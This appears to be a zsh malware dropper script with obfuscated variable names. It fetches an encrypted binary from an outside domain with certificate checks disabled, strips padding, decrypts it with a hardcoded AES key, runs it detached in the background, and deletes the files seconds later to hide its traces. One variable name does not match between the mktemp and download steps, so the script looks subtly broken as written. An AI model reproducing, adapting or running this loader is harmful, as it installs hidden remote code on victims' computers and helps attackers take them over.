#!/bin/zsh
tjumd=$(mktemp /tmp/x5gsqx.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m92b650a47d75fbbd.bin" -o "$tjumdz" || exit 1
bjyyvs=$(stat -f %z "$tjumdz"); cg33j32=$(( bjyyvs - 2450 - 992 ))
tail -c +$(( 2450 + 1 )) "$tjumdz" | head -c $cg33j32 | openssl enc -d -aes-256-cbc -k 31b1238dfa824f41ed4cdf66 -out "$tjumd" 2>/dev/null
[ -s "$tjumd" ] && chmod 700 "$tjumd" && ( "$tjumd" & ) && disown
( sleep 3; rm -f "$tjumd" "$tjumdz" ) &>/dev/null &
